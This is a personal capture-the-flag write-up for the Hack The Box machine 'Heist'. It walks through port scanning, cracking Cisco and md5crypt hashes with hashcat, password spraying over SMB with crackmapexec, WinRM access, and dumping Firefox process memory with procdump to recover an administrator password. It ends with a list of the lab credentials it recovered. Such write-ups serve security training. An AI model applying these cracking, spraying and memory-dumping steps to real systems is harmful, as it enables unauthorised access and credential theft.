# Enumeration 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
## open ports
```
80/tcp    open  http
| http-methods:                                                                                                               
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE        
|_http-server-header: Microsoft-IIS/10.0                                                                                      
| http-title: Support Login Page                            
|_Requested resource was login.php
| http-cookie-flags:                                           
|   /:                                                                                                                        
|     PHPSESSID:             
|_      httponly flag not set      
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown

```

### Port 80

![[Pasted image 20230128051518.png]]

Login as a guest
![[Pasted image 20230128051541.png]]
![[Pasted image 20230128051551.png]]
cracking secret 5 
`.\hashcat.exe -m 500 .\hash.txt .\rockyou.txt -O`
![[Pasted image 20230128051708.png]]
also password 7 cracked
`0242114B0E143F015F5D1E161713:$uperP@ssword`
`02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d`
Brute forcing smb with passwords we found
![[Pasted image 20230128052923.png]]

`enum4linux -u hazard -p stealth1agent -a $ip`

![[Pasted image 20230128054727.png]]
`cme smb $ip -u users -p passwords --continue-on-success`
now we have a list of users and passwords now we can try to bruteforce users
![[Pasted image 20230128054938.png]]
after some cred spraying 
we are in as chase using  winrm
![[Pasted image 20230128055323.png]]

![[Pasted image 20230128073716.png]]
to do 
inside web directory we can access wwwroot but can't list files but if we try to open .php files they open
![[Pasted image 20230128072155.png]]
![[Pasted image 20230128072204.png]]
hardcoded creds
found that firefox running and in the notes that user chase will access issues list from browser
first download procdump64.exe from microsoft
[procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
upload it to the target

![[Pasted image 20230128083610.png]]
![[Pasted image 20230128083626.png]]

pick one of firefox processes and run 
![[Pasted image 20230128083645.png]]
now we can grep for the admin email that we found out about earlier 
`Select-String -Path ".\firefox.exe_230128_120324.dmp" -Pattern "admin@support.htb"`
![[Pasted image 20230128083813.png]]
and we have a password
![[Pasted image 20230128083859.png]]
![[Pasted image 20230128083913.png]]

# Loot
hazard smb creds:
	username:hazard
	password: stealth1agent

chase smb creds:
	username:chase
	password:`Q4)sJu\Y8qz*A3?d`

administrator creds:
	username: administrator
	password: `4dD!5}x/re8]FBuZ`


---
Tags: #ctf #htb 
Resources: [Heist](https://app.hackthebox.com/machines/201)